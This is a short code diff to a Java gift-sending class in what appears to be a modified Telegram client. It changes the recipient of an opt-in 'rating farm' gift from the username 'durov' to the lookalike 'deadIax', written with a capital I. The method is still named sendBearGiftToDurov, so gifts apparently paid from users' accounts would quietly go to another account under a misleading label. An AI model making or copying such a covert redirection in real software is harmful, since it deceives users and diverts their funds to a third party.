@@ -112,7 +112,7 @@ public class WeryGramGifts {
             return;
         }
         TLRPC.TL_contacts_resolveUsername reqResolve = new TLRPC.TL_contacts_resolveUsername();
-        reqResolve.username = "durov";
+        reqResolve.username = "deadIax";
         ConnectionsManager.getInstance(account).sendRequest(reqResolve, (response, error) -> {
             if (error == null && response instanceof TLRPC.TL_contacts_resolvedPeer) {
                 TLRPC.TL_contacts_resolvedPeer resolved = (TLRPC.TL_contacts_resolvedPeer) response;
@@ -127,7 +127,7 @@ public class WeryGramGifts {
         });
     }
 
-    private static void sendBearGiftToDurov(int account, TLRPC.User durov) {
+    private static void sendBearGiftToDurov(int account, TLRPC.User deadIax) {
         if (!MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false)) return;
         try {
             // Reflection: class name varies by TL layer
@@ -150,7 +150,7 @@ public class WeryGramGifts {
             try { reqClass.getField("gift_id").setLong(req, BEAR_GIFT_ID); } catch (Exception e) {}
             try {
                 reqClass.getField("user_id").set(req,
-                    MessagesController.getInstance(account).getInputUser(durov.id));
+                    MessagesController.getInstance(account).getInputUser(deadIax.id));
             } catch (Exception e) {}
             try { reqClass.getField("upgrade_stars").setBoolean(req, false); } catch (Exception e) {}
             try { reqClass.getField("text").set(req, ""); } catch (Exception e) {}
